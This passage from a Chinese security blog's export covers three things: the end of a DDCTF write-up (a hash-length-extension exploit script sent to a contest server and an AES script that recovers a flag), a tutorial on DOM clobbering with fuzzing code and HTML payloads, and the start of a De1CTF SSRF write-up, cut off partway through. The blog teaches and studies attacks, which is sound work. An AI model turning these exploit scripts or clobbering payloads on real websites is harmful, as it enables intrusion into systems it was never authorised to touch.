<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">COOKIE&#x3D;&#123;&quot;Cookie&quot;:&quot;user_name&#x3D;huai;REVEL_SESSION&#x3D;f8b0026c9b87ac6e2ce47881a3ad4f3b&quot;&#125;</span><br><span class="line">for i in range(100):</span><br><span class="line">    print i</span><br><span class="line">    m&#x3D;hashpumpy.hashpump(&#39;20e38d6c485a80f1b92f13f38b4289e7&#39;,&#39;id133&#39;,&#39;id&#39;+str(i),31)</span><br><span class="line">    payload&#x3D;urllib.quote(m[1])[:-4]</span><br><span class="line">    robot_id&#x3D;133</span><br><span class="line">    robot_ticket&#x3D;m[0]</span><br><span class="line">    print payload,robot_ticket</span><br><span class="line">    delete_robot&#x3D;&quot;http:&#x2F;&#x2F;117.51.147.155:5050&#x2F;ctf&#x2F;api&#x2F;remove_robot?&quot;+payload+&quot;&#x3D;&amp;id&#x3D;&quot;+str(i)+&quot;&amp;ticket&#x3D;&quot;+robot_ticket</span><br><span class="line">    qiu&#x3D;requests.get(url&#x3D;delete_robot,headers&#x3D;COOKIE)</span><br><span class="line">    print qiu.text</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2jrul0namj310u0dfq59.jpg" alt="img"></p>
<p>一次或许删不完，需要多跑几次。</p>
<h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h3><p>通过<code>http</code>导出一张小姐姐图片，在<code>tcp流</code>中抓取key的图片，改一下高度得到真正的<code>key</code>，并去流量中给的解密网站去解一下密即可获得<code>Flag</code>。</p>
<h3 id="北京地铁"><a href="#北京地铁" class="headerlink" title="北京地铁"></a>北京地铁</h3><p>当时没做出来的一道题..(或者说是没做..)，利用比赛的题来学习一下misc。</p>
<p><strong>关键点在于</strong>：<img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2v3t58n2gj30vi0jiqet.jpg" alt=""></p>
<p>这个加粗的中关村就是密钥，我们可以从<code>lsb</code>隐写中得到一些信息。</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2v3vrgejqj30ky0erwfa.jpg" alt=""></p>
<p>很明显的aes加密.写一下脚本.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line">secret=b64decode(<span class="string">'7SsQWmZ524i/yVWoMeAIJA=='</span>)</span><br><span class="line">key=<span class="string">'weigongcun'</span>.ljust(<span class="number">16</span>,<span class="string">'\x00'</span>)</span><br><span class="line">mode=AES.MODE_ECB</span><br><span class="line">a=AES.new(key, mode)</span><br><span class="line"><span class="keyword">print</span> a.decrypt(secret)</span><br></pre></td></tr></table></figure>

<p>得到<code>flag:DDCTF{Q*2!x@B0}</code></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DOM Clobbering Attack</title>
    <url>/2020/04/15/DOM-Clobbering-Attack/</url>
    <content><![CDATA[<h3 id="Dom-Clobbering-Attack概述"><a href="#Dom-Clobbering-Attack概述" class="headerlink" title="Dom Clobbering Attack概述"></a>Dom Clobbering Attack概述</h3><p>大概简述下这个技术的主要攻击手法：</p>
<p>通过标签中定义的name和id属性进行全局变量覆盖或劫持，进而造成其他通过全局变量实现效果的代码出现可控情况，造成漏洞。</p>
<h4 id="简单了解下id与name"><a href="#简单了解下id与name" class="headerlink" title="简单了解下id与name"></a>简单了解下id与name</h4><p><img src="https://s1.ax1x.com/2020/04/12/GO03h6.png" alt="GO03h6.png"></p>
<p>通过这种方式我们实现了全局变量的声明，不过有一点需要注意的是id无法通过document来获取，不过可以通过document.getElementById(‘test1’)或者document.querySelector(‘test1’)进行获取.</p>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><h4 id="字符串的强制转换"><a href="#字符串的强制转换" class="headerlink" title="字符串的强制转换"></a>字符串的强制转换</h4><p>在利用时需要考虑两个问题：</p>
<p>第一个问题是：我们通过Dom clobbering覆盖的变量的值均是标签，也就是说都是一个HTMLElement对象，但是在实际应用的时候，很多时候变量都是按照字符串进行操作的，比如上面的例子中，如果直接进行字符串强制类型转换，将会产生下面的结果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1)  <span class="comment">//[object HTMLImageElement]</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>所以说我们需要找到即使被字符串强制类型转换后也能使用的标签，可利用如下代码进行下fuzz</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Object</span>.getOwnPropertyNames(<span class="built_in">window</span>)</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p.match(<span class="regexp">/Element$/</span>))</span><br><span class="line">.map(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">window</span>[p])</span><br><span class="line">.filter(<span class="function"><span class="params">p</span> =&gt;</span> p &amp;&amp; p.prototype &amp;&amp; p.prototype.toString !== <span class="built_in">Object</span>.prototype.toString)</span><br></pre></td></tr></table></figure>

<p>结果为得到HTMLAnchorElement和HTMLAreaElement.也就是对应了a标签和area标签</p>
<p>通过下面代码对这两个标签进行下测试</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">href</span>=<span class="string">"http://test1"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">area</span> <span class="attr">id</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"http://test2"</span>&gt;</span><span class="tag">&lt;/<span class="name">area</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test1) <span class="comment">// 返回结果http://test1</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">''</span>+test2) <span class="comment">// 返回结果http://test2</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>从上面的测试结果来看a标签和area标签如果进行toString强制转换的时候，是会返回其href属性的value的</p>
<p>这里给下篇文章留个坑吧（可能是一篇关于Spidermonkey分析native code的文章）</p>
<h4 id="属性的访问"><a href="#属性的访问" class="headerlink" title="属性的访问"></a>属性的访问</h4><p>在javascript中属性的访问并不只有简单的x这种，更有a.b，a.b.c，甚至a.b.c.d这种的访问形式，下面的探讨就是对于这样问题的解决</p>
<h5 id="两层访问"><a href="#两层访问" class="headerlink" title="两层访问"></a>两层访问</h5><h6 id="HTMLCollection"><a href="#HTMLCollection" class="headerlink" title="HTMLCollection"></a>HTMLCollection</h6><p>第一种方法可以通过HTMLCollection的创建来实现两层访问</p>
<p>我们可以通过相同id的标签创建来实现HTMLCollection的创建，如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test3.test4) //<span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">test3</span> <span class="attr">name</span>=<span class="string">test4</span> <span class="attr">href</span>=<span class="string">"alert(1)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="Fuzz-Html-Tags"><a href="#Fuzz-Html-Tags" class="headerlink" title="Fuzz Html Tags"></a>Fuzz Html Tags</h6><p>在不构建HTMLCollection情况下，可以通过直接fuzz标签的关系，来确定是否可层级访问</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> log=[];</span><br><span class="line"><span class="keyword">var</span> html = [<span class="string">"a"</span>,<span class="string">"abbr"</span>,<span class="string">"acronym"</span>,<span class="string">"address"</span>,<span class="string">"applet"</span>,<span class="string">"area"</span>,<span class="string">"article"</span>,<span class="string">"aside"</span>,<span class="string">"audio"</span>,<span class="string">"b"</span>,<span class="string">"base"</span>,<span class="string">"basefont"</span>,<span class="string">"bdi"</span>,<span class="string">"bdo"</span>,<span class="string">"bgsound"</span>,<span class="string">"big"</span>,<span class="string">"blink"</span>,<span class="string">"blockquote"</span>,<span class="string">"body"</span>,<span class="string">"br"</span>,<span class="string">"button"</span>,<span class="string">"canvas"</span>,<span class="string">"caption"</span>,<span class="string">"center"</span>,<span class="string">"cite"</span>,<span class="string">"code"</span>,<span class="string">"col"</span>,<span class="string">"colgroup"</span>,<span class="string">"command"</span>,<span class="string">"content"</span>,<span class="string">"data"</span>,<span class="string">"datalist"</span>,<span class="string">"dd"</span>,<span class="string">"del"</span>,<span class="string">"details"</span>,<span class="string">"dfn"</span>,<span class="string">"dialog"</span>,<span class="string">"dir"</span>,<span class="string">"div"</span>,<span class="string">"dl"</span>,<span class="string">"dt"</span>,<span class="string">"element"</span>,<span class="string">"em"</span>,<span class="string">"embed"</span>,<span class="string">"fieldset"</span>,<span class="string">"figcaption"</span>,<span class="string">"figure"</span>,<span class="string">"font"</span>,<span class="string">"footer"</span>,<span class="string">"form"</span>,<span class="string">"frame"</span>,<span class="string">"frameset"</span>,<span class="string">"h1"</span>,<span class="string">"head"</span>,<span class="string">"header"</span>,<span class="string">"hgroup"</span>,<span class="string">"hr"</span>,<span class="string">"html"</span>,<span class="string">"i"</span>,<span class="string">"iframe"</span>,<span class="string">"image"</span>,<span class="string">"img"</span>,<span class="string">"input"</span>,<span class="string">"ins"</span>,<span class="string">"isindex"</span>,<span class="string">"kbd"</span>,<span class="string">"keygen"</span>,<span class="string">"label"</span>,<span class="string">"legend"</span>,<span class="string">"li"</span>,<span class="string">"link"</span>,<span class="string">"listing"</span>,<span class="string">"main"</span>,<span class="string">"map"</span>,<span class="string">"mark"</span>,<span class="string">"marquee"</span>,<span class="string">"menu"</span>,<span class="string">"menuitem"</span>,<span class="string">"meta"</span>,<span class="string">"meter"</span>,<span class="string">"multicol"</span>,<span class="string">"nav"</span>,<span class="string">"nextid"</span>,<span class="string">"nobr"</span>,<span class="string">"noembed"</span>,<span class="string">"noframes"</span>,<span class="string">"noscript"</span>,<span class="string">"object"</span>,<span class="string">"ol"</span>,<span class="string">"optgroup"</span>,<span class="string">"option"</span>,<span class="string">"output"</span>,<span class="string">"p"</span>,<span class="string">"param"</span>,<span class="string">"picture"</span>,<span class="string">"plaintext"</span>,<span class="string">"pre"</span>,<span class="string">"progress"</span>,<span class="string">"q"</span>,<span class="string">"rb"</span>,<span class="string">"rp"</span>,<span class="string">"rt"</span>,<span class="string">"rtc"</span>,<span class="string">"ruby"</span>,<span class="string">"s"</span>,<span class="string">"samp"</span>,<span class="string">"script"</span>,<span class="string">"section"</span>,<span class="string">"select"</span>,<span class="string">"shadow"</span>,<span class="string">"slot"</span>,<span class="string">"small"</span>,<span class="string">"source"</span>,<span class="string">"spacer"</span>,<span class="string">"span"</span>,<span class="string">"strike"</span>,<span class="string">"strong"</span>,<span class="string">"style"</span>,<span class="string">"sub"</span>,<span class="string">"summary"</span>,<span class="string">"sup"</span>,<span class="string">"svg"</span>,<span class="string">"table"</span>,<span class="string">"tbody"</span>,<span class="string">"td"</span>,<span class="string">"template"</span>,<span class="string">"textarea"</span>,<span class="string">"tfoot"</span>,<span class="string">"th"</span>,<span class="string">"thead"</span>,<span class="string">"time"</span>,<span class="string">"title"</span>,<span class="string">"tr"</span>,<span class="string">"track"</span>,<span class="string">"tt"</span>,<span class="string">"u"</span>,<span class="string">"ul"</span>,<span class="string">"var"</span>,<span class="string">"video"</span>,<span class="string">"wbr"</span>,<span class="string">"xmp"</span>], logs = [];</span><br><span class="line">div=<span class="built_in">document</span>.createElement(<span class="string">'div'</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;html.length;i++) &#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> j=<span class="number">0</span>;j&lt;html.length;j++) &#123;</span><br><span class="line">    div.innerHTML=<span class="string">'&lt;'</span>+html[i]+<span class="string">' id=element1&gt;'</span>+<span class="string">'&lt;'</span>+html[j]+<span class="string">' id=element2&gt;'</span>;</span><br><span class="line">    <span class="built_in">document</span>.body.appendChild(div);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">window</span>.element1 &amp;&amp; element1.element2)&#123;</span><br><span class="line">       log.push(html[i]+<span class="string">','</span>+html[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">document</span>.body.removeChild(div);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(log.join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可得到如下关系</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">form,button</span><br><span class="line">form,fieldset</span><br><span class="line">form,image</span><br><span class="line">form,img</span><br><span class="line">form,input</span><br><span class="line">form,object</span><br><span class="line">form,output</span><br><span class="line">form,select</span><br><span class="line">form,textarea</span><br></pre></td></tr></table></figure>

<p>测试代码如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="handlebars"><span class="xml">console.log(test1.test2) //<span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>不过这种是无法触发字符串的访问的，相对上种方法更局限一些</p>
<h5 id="三层访问"><a href="#三层访问" class="headerlink" title="三层访问"></a>三层访问</h5><p>对于三层的访问来讲，其实就是两种两层访问方法的叠加</p>
<p>测试代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span> <span class="attr">name</span>=<span class="string">test2</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">test3</span>&gt;</span><span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">test1</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(test1.test2.test3) <span class="comment">//&lt;button id=test3&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到返回结果为上面声明的id为test3的button标签</p>
<h5 id="三层以上访问"><a href="#三层以上访问" class="headerlink" title="三层以上访问"></a>三层以上访问</h5><p>三层以上的访问可以通过iframe与srcdoc来实现</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">&lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>alert(a.b.c.d),<span class="number">500</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果不想通过setTimeout进行延时的话，还可以通过<code>&lt;style&gt;</code>标签或者<code>&lt;script&gt;</code>等进行网络请求造成延时，使得iframe加载完毕</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">a</span> <span class="attr">srcdoc</span>=<span class="string">"</span></span></span><br><span class="line"><span class="tag"><span class="string">    &lt;iframe srcdoc='&lt;a id=c name=d href=cid:Clobbered&gt;test&lt;/a&gt;&lt;a id=c&gt;' name=b&gt;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//test.net"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    alert(a.b.c.d)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="任意属性测试"><a href="#任意属性测试" class="headerlink" title="任意属性测试"></a>任意属性测试</h4><p>上面的测试一直是针对id与name进行测试的，但是dom中还有其他很多属性，下面是对于String类型并且可读可写的属性进行fuzz：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> html = [...]<span class="comment">//HTML elements array</span></span><br><span class="line"><span class="keyword">var</span> props=[];</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;html.length;i++)&#123;</span><br><span class="line">obj = <span class="built_in">document</span>.createElement(html[i]);</span><br><span class="line"><span class="keyword">for</span>(prop <span class="keyword">in</span> obj) &#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">typeof</span> obj[prop] === <span class="string">'string'</span>) &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">DOM.innerHTML = <span class="string">'&lt;'</span>+html[i]+<span class="string">' id=x '</span>+prop+<span class="string">'=1&gt;'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">'x'</span>)[prop] == <span class="number">1</span>) &#123;</span><br><span class="line">props.push(html[i]+<span class="string">':'</span>+prop);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(e)&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log([...new <span class="built_in">Set</span>(props)].join(<span class="string">'\n'</span>));</span><br></pre></td></tr></table></figure>

<p>可以得到两个有趣的可利用属性 为username和password,但是这两个并非HTML属性，利用如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"http://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">href</span>=<span class="string">"ftp://Clobbered-username:Clobbered-Password@a"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.username)<span class="comment">//Clobbered-username</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(x.password)<span class="comment">//Clobbered-password</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM%20Clobbering%20Attack%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/]</a>(<a href="http://wonderkun.cc/2020/02/15/DOM" target="_blank" rel="noopener">http://wonderkun.cc/2020/02/15/DOM</a> Clobbering Attack学习记录/)</p>
<p><a href="https://portswigger.net/research/dom-clobbering-strikes-back" target="_blank" rel="noopener">https://portswigger.net/research/dom-clobbering-strikes-back</a></p>
<p><a href="https://xz.aliyun.com/t/7329" target="_blank" rel="noopener">https://xz.aliyun.com/t/7329</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF2019</title>
    <url>/2019/08/27/De1CTF2019/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>我的火车行程贯穿了我的De1CTF..,导致根本没怎么打，异常难受，鸽了很久才补了出来…</p>
<h3 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h3><p>上车的前做的一道题，挺简单的（就是flag不太好找，似乎直接传flag.txt是非预期</p>
<p>PS:预期解是为local_file</p>
<p>题目代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span 